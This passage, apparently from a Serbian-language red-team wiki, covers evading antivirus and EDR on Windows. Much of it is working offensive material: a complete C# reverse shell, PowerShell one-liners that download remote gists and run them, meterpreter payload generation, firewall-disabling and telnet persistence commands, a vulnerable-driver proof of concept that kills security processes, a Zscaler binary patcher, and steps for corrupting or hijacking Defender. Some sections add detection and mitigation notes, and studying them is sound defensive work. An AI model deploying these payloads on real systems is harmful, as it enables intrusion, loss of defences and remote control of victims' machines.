> Ako želite da pročitate više o C# Assembly loading, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Takođe možete učitati C# Assemblies **from PowerShell**, pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršiti maliciozni kod koristeći druge jezike tako što ćete kompromitovanom računaru omogućiti pristup **to the interpreter environment installed on the Attacker Controlled SMB share**.

Omogućavanjem pristupa Interpreter Binaries i okruženju na SMB share-u možete **izvršavati proizvoljni kod u ovim jezicima unutar memorije** kompromitovanog računara.

Repo navodi: Defender i dalje skenira skripte ali korišćenjem Go, Java, PHP itd. imamo **više fleksibilnosti da zaobiđemo static signatures**. Testiranje sa slučajnim ne-obfuskiranim reverse shell skriptama u ovim jezicima se pokazalo uspešnim.

## TokenStomping

Token stomping je tehnika koja omogućava napadaču da **manipuliše access token-om ili sigurnosnim proizvodom kao što je EDR ili AV**, dozvoljavajući im da smanje njegove privilegije tako da proces neće umreti, ali neće imati dozvole da proverava maliciozne aktivnosti.

Da bi se ovo sprečilo, Windows bi mogao **sprečiti eksternim procesima** da dobijaju handle-ove nad tokenima sigurnosnih procesa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Kao što je opisano u [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), lako je samo deploy-ovati Chrome Remote Desktop na žrtvin računar i potom ga iskoristiti za takeover i održavanje persistence:
1. Download from https://remotedesktop.google.com/, kliknite na "Set up via SSH", pa zatim kliknite na MSI fajl za Windows da preuzmete MSI.
2. Pokrenite installer silently na žrtvi (admin rights su potrebni): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na Chrome Remote Desktop stranicu i kliknite next. Wizard će zatim tražiti autorizaciju; kliknite Authorize da nastavite.
4. Izvršite dati parametar sa nekim prilagodbama: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Napomena: pin param omogućava podešavanje pina bez korišćenja GUI-ja).

## Advanced Evasion

Evasion je veoma komplikovana tema, ponekad morate uzeti u obzir mnogo različitih izvora telemetrije u samo jednom sistemu, tako da je praktično nemoguće ostati potpuno neotkriven u zrelim okruženjima.

Svako okruženje na koje naiđete ima svoje snage i slabosti.

Toplo vam preporučujem da pogledate ovaj talk od [@ATTL4S](https://twitter.com/DaniLJ94), da dobijete uvid u Napredne Evasion tehnike.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je takođe još jedan odličan talk od [@mariuszbit](https://twitter.com/mariuszbit) o Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) koji će **remove parts of the binary** dok ne **finds out which part Defender** smatra malicioznim i podeli vam to.\
Drugi alat koji radi **isto je** [**avred**](https://github.com/dobin/avred) sa javnom web uslugom na [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows10, svi Windows su dolazili sa **Telnet server-om** koji ste mogli instalirati (kao administrator) radeći:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Neka se **pokrene** pri pokretanju sistema i **pokreni** ga sada:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Promeni telnet port** (neprimetno) i isključi firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Preuzmite ga sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (želite bin downloads, ne setup)

**ON THE HOST**: Pokrenite _**winvnc.exe**_ i konfigurišite server:

- Omogućite opciju _Disable TrayIcon_
- Postavite lozinku u _VNC Password_
- Postavite lozinku u _View-Only Password_

Zatim, premestite binarni _**winvnc.exe**_ i **novo** kreirani fajl _**UltraVNC.ini**_ u **victim**

#### **Reverse connection**

The **attacker** treba da na svom **host** pokrene binarni `vncviewer.exe -listen 5900` kako bi bio pripremljen da prihvati reverse **VNC connection**. Zatim, na **victim**: pokrenite winvnc daemon `winvnc.exe -run` i pokrenite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Da biste ostali neopaženi, morate izbegavati sledeće

- Ne pokrećite `winvnc` ako već radi ili ćete izazvati a [popup](https://i.imgur.com/1SROTTl.png). Proverite da li radi sa `tasklist | findstr winvnc`
- Ne pokrećite `winvnc` bez `UltraVNC.ini` u istom direktorijumu ili će se otvoriti [the config window](https://i.imgur.com/rfMQWcf.png)
- Ne pokrećite `winvnc -h` za pomoć ili ćete izazvati [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite ga sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Unutar GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sada **pokrenite lister** sa `msfconsole -r file.rc` i **izvršite** **xml payload** pomoću:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Trenutni defender će vrlo brzo prekinuti proces.**

### Kompajliranje našeg sopstvenog reverse shell-a

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# Revershell

Kompajlirajte ga sa:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Koristite ga sa:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# korišćenje kompajlera
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuscatora za C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Korišćenje python-a za build injectors — primer:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ostali alati
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Onemogućavanje AV/EDR iz kernel prostora

Storm-2603 je iskoristio mali konzolni alat poznat kao **Antivirus Terminator** da onemogući endpoint zaštite pre ispuštanja ransomware-a. Alat donosi svoj **own vulnerable but *signed* driver** i zloupotrebljava ga za izdavanje privilegovanih kernel operacija koje čak i Protected-Process-Light (PPL) AV servisi ne mogu blokirati.

Ključni zaključci
1. **Signed driver**: Fajl koji se isporučuje na disk je `ServiceMouse.sys`, ali binarni fajl je legitimno potpisan driver `AToolsKrnl64.sys` iz Antiy Labs-ovog “System In-Depth Analysis Toolkit”. Pošto driver nosi važeći Microsoft potpis, učitava se čak i kada je Driver-Signature-Enforcement (DSE) omogućen.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Prva linija registruje driver kao **kernel service**, a druga ga pokreće tako da `\\.\ServiceMouse` postane dostupan iz user land-a.
3. **IOCTLs exposed by the driver**
| IOCTL code | Mogućnost                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Završava proizvoljan proces po PID-u (koristi se za ubijanje Defender/EDR servisa) |
| `0x990000D0` | Briše proizvoljan fajl na disku |
| `0x990001D0` | Uklanja driver i briše servis |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD preskače user-mode zaštite u potpunosti; kod koji se izvršava u kernelu može otvoriti *protected* procese, završiti ih ili manipulisati kernel objektima bez obzira na PPL/PP, ELAM ili druge hardening funkcije.

Detection / Mitigation
•  Omogućite Microsoft-ovu listu blokiranih vulnerable-driver-a (`HVCI`, `Smart App Control`) tako da Windows odbije da učita `AToolsKrnl64.sys`.  
•  Pratite kreiranja novih *kernel* servisa i alarmirajte kada je driver učitan iz world-writable direktorijuma ili nije prisutan na allow-listi.  
•  Pratite user-mode handle-ove ka custom device objektima praćene sumnjivim `DeviceIoControl` pozivima.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler-ov **Client Connector** primenjuje device-posture pravila lokalno i oslanja se na Windows RPC da komunicira rezultate drugim komponentama. Dve slabe dizajn odluke omogućavaju potpuni bypass:

1. Evaluacija posture se dešava **potpuno na klijentu** (serveru se šalje boolean).  
2. Interni RPC endpoint-i samo validiraju da je izvršna datoteka **potpisana od strane Zscaler-a** (putem `WinVerifyTrust`).

Patchovanjem četiri potpisana binarna fajla na disku obe mehanizme je moguće neutralisati:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1` pa je svaka provera u skladu |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ bilo koji (čak i unsigned) proces može da se poveže na RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjeno sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Prekinuto / short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nakon zamene originalnih fajlova i restartovanja servisnog stacka:

* **Svi** posture checks prikazuju **zeleno/usaglašeno**.
* Nepotpisani ili modifikovani binarni fajlovi mogu otvoriti named-pipe RPC endpoints (npr. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromitovani host dobija neograničen pristup internoj mreži definisanoj Zscaler politikama.

Ova studija slučaja pokazuje kako čisto klijentske odluke poverenja i jednostavne provere potpisa mogu biti poništene sa nekoliko bajt zakrpa.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) nameće hijerarhiju potpisivač/nivo tako da se samo zaštićeni procesi sa istim ili višim privilegijama mogu međusobno manipulisati. Ofanzivno, ako možete legitimno pokrenuti PPL-om omogućen binarni fajl i kontrolisati njegove argumente, možete pretvoriti benignu funkcionalnost (npr. logging) u ograničeni, PPL-podržani zapisni primitiv protiv zaštićenih direktorijuma koje koriste AV/EDR.

Šta čini da se proces pokreće kao PPL
- Ciljni EXE (i svi učitani DLL-ovi) moraju biti potpisani sa EKU koji podržava PPL.
- Proces mora biti kreiran pomoću CreateProcess koristeći flagove: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Mora se zahtevati kompatibilan nivo zaštite koji odgovara potpisivaču binarnog fajla (npr. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` za anti-malware potpisivače, `PROTECTION_LEVEL_WINDOWS` za Windows potpisivače). Pogrešni nivoi će izazvati grešku pri kreiranju.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (odabire nivo zaštite i prosleđuje argumente ciljnog EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Primer upotrebe:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` samostalno se pokreće i prima parametar za upis log fajla na putanju koju navede pozivalac.
- Kada se pokrene kao PPL proces, upis fajla se vrši pod PPL zaštitom.
- ClipUp ne može parsirati putanje koje sadrže razmake; koristi 8.3 short paths da ukažeš na obično zaštićene lokacije.

8.3 short path helpers
- Prikaži kratka imena: `dir /x` u svakom roditeljskom direktorijumu.
- Dobij skraćenu putanju u cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Pokreni PPL-sposoban LOLBIN (ClipUp) sa `CREATE_PROTECTED_PROCESS` koristeći pokretač (npr. CreateProcessAsPPL).
2) Prosledi ClipUp log-path argument da bi se forsiralo kreiranje fajla u zaštićenom AV direktorijumu (npr. Defender Platform). Koristi 8.3 short names po potrebi.
3) Ako je ciljni binarni fajl obično otvoren/zaključan od strane AV dok radi (npr. MsMpEng.exe), zakaži upis pri boot-u pre nego što AV krene instaliranjem servisa sa automatskim startom koji se pouzdano izvršava ranije. Validiraj redosled pri boot-u koristeći Process Monitor (boot logging).
4) Nakon reboot-a, upis sa PPL zaštitom se dogodi pre nego što AV zaključa svoje binarne fajlove, oštećujući ciljni fajl i sprečavajući njegovo pokretanje.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Napomene i ograničenja
- Ne možete kontrolisati sadržaj koji ClipUp upisuje izvan mesta gde se postavlja; ovaj primitiv je pogodniji za korupciju nego za precizno ubacivanje sadržaja.
- Zahteva local admin/SYSTEM za instalaciju/pokretanje servisa i prozor za ponovno pokretanje sistema.
- Vreme je kritično: cilj ne sme biti otvoren; izvršavanje pri pokretanju sistema izbegava zaključavanja fajlova.

Detekcije
- Kreiranje procesa `ClipUp.exe` sa neobičnim argumentima, naročito ako je roditelj proces ne-standardnog pokretača, prilikom pokretanja sistema.
- Novi servisi konfigurisani da automatski pokreću sumnjive binarije i koji dosledno startuju pre Defender/AV. Istražite kreiranje/izmenu servisa pre grešaka pri pokretanju Defender-a.
- Monitoring integriteta fajlova nad Defender binarijama/Platform direktorijumima; neočekivana kreiranja/izmene fajlova od procesa koji koriste protected-process flag.
- ETW/EDR telemetrija: tražite procese kreirane sa `CREATE_PROTECTED_PROCESS` i anomalnu upotrebu PPL nivoa od strane ne-AV binarija.

Mitigacije
- WDAC/Code Integrity: ograničite koji potpisani binariji mogu da rade kao PPL i pod kojim roditeljima; blokirajte pozive ClipUp izvan legitimnih konteksta.
- Higijena servisa: ograničite kreiranje/izmenu servisa koji se automatski startuju i nadgledajte manipulacije redosledom pokretanja.
- Osigurajte da su Defender tamper protection i early-launch protections omogućeni; istražite greške pri pokretanju koje ukazuju na korupciju binarija.
- Razmotrite onemogućavanje 8.3 short-name generisanja na volumenima koji hostuju security tooling ako je kompatibilno sa vašim okruženjem (temeljno testirajte).

Reference za PPL i alate
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU referenca: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL pokretač: https://github.com/2x7EQ13/CreateProcessAsPPL
- Tehnička analiza (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender bira platformu iz koje se pokreće tako što pretražuje podfoldere u:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Izabere podfolder sa najvećim leksikografskim verzionim stringom (npr. `4.18.25070.5-0`), zatim odatle pokreće Defender service procese (ažurirajući service/registry putanje u skladu s tim). Ovaj izbor veruje stavkama direktorijuma uključujući directory reparse points (symlinks). Administrator može iskoristiti ovo da preusmeri Defender na putanju upisivu od strane napadača i ostvari DLL sideloading ili ometanje servisa.

Preduslovi
- Local Administrator (potrebno za kreiranje direktorijuma/symlink-ova pod Platform folderom)
- Mogućnost restartovanja ili izazivanja ponovnog izbora Defender platforme (service restart pri boot-u)
- Potrebni su samo ugrađeni alati (mklink)

Zašto ovo funkcioniše
- Defender blokira upise u svoje foldere, ali izbor platforme veruje unosima u direktorijumu i bira leksikografski najveću verziju bez potvrde da ciljna lokacija ukazuje na zaštićenu/pouzdanu putanju.

Korak po korak (primer)
1) Pripremite upisivi klon trenutnog Platform foldera, npr. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Kreirajte directory symlink sa višom verzijom unutar Platform koji pokazuje na vaš folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Odabir okidača (preporučeno ponovno pokretanje):
```cmd
shutdown /r /t 0
```
4) Proverite da li se MsMpEng.exe (WinDefend) izvršava iz preusmerene putanje:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Trebalo bi da primetite novu putanju procesa pod `C:\TMP\AV\` i konfiguraciju servisa/registrija koja odražava tu lokaciju.

Opcije post-eksploatacije
- DLL sideloading/code execution: Postavite ili zamenite DLL-ove koje Defender učitava iz svog direktorijuma aplikacije kako biste izvršili kod u Defenderovim procesima. Vidi odeljak iznad: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Uklonite version-symlink tako da se pri sledećem pokretanju konfigurisana putanja ne razreši i Defender neće uspeti da se pokrene:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Imajte na umu da ova tehnika sama po sebi ne obezbeđuje privilege escalation; zahteva admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams mogu da premeste runtime evasion iz C2 implant-a u sam cilj modul tako što će hook-ovati njegov Import Address Table (IAT) i preusmeriti odabrane APIs kroz attacker-controlled, position‑independent code (PIC). Ovo generalizuje evasion van uskog API surface-a koji mnogi kitovi izlažu (npr. CreateProcessA) i proširuje iste zaštite na BOFs i post‑exploitation DLLs.

High-level approach
- Stage a PIC blob pored cilj modula koristeći reflective loader (prepended ili companion). PIC mora biti self‑contained i position‑independent.
- Dok se host DLL učitava, prođite kroz njegov IMAGE_IMPORT_DESCRIPTOR i patch-ujte IAT unose za ciljane imports (npr. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) da pokazuju na tanke PIC wrappers.
- Svaki PIC wrapper izvršava evasions pre nego što tail‑call-uje stvarnu adresu API-ja. Tipične evasions uključuju:
  - Memory mask/unmask oko poziva (npr. encrypt beacon regions, RWX→RX, promena imena/permisiona stranica) i vraćanje posle poziva.
  - Call‑stack spoofing: konstruisati benign stack i preći u ciljani API tako da call‑stack analiza rezolvuju očekivane frame-ove.
- Za kompatibilnost, eksportujte interfejs tako da Aggressor script (ili ekvivalent) može registrovati koje API-je hook-ovati za Beacon, BOFs i post‑ex DLLs.

Why IAT hooking here
- Radi za bilo koji kod koji koristi hook-ovani import, bez menjanja tool koda ili oslanjanja na Beacon da proxy‑uje specifične APIs.
- Pokriva post‑ex DLLs: hooking LoadLibrary* vam omogućava da presretnete učitavanja modula (npr. System.Management.Automation.dll, clr.dll) i primenite istu masking/stack evasion na njihove API pozive.
- Vraća pouzdano korišćenje process‑spawning post‑ex komandi protiv detekcija zasnovanih na call‑stack-u tako što se obuhvati CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Beleške
- Apply the patch after relocations/ASLR and before first use of the import. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
- Keep wrappers tiny and PIC-safe; resolve the true API via the original IAT value you captured before patching or via LdrGetProcedureAddress.
- Use RW → RX transitions for PIC and avoid leaving writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs build a fake call chain (return addresses into benign modules) and then pivot into the real API.
- This defeats detections that expect canonical stacks from Beacon/BOFs to sensitive APIs.
- Pair with stack cutting/stack stitching techniques to land inside expected frames before the API prologue.

Operativna integracija
- Prepend the reflective loader to post‑ex DLLs so the PIC and hooks initialise automatically when the DLL is loaded.
- Use an Aggressor script to register target APIs so Beacon and BOFs transparently benefit from the same evasion path without code changes.

Razmatranja za detekciju/DFIR
- IAT integrity: entries that resolve to non‑image (heap/anon) addresses; periodic verification of import pointers.
- Stack anomalies: return addresses not belonging to loaded images; abrupt transitions to non‑image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes to IAT, early DllMain activity that modifies import thunks, unexpected RX regions created at load.
- Image‑load evasion: if hooking LoadLibrary*, monitor suspicious loads of automation/clr assemblies correlated with memory masking events.

Povezani blokovi i primeri
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
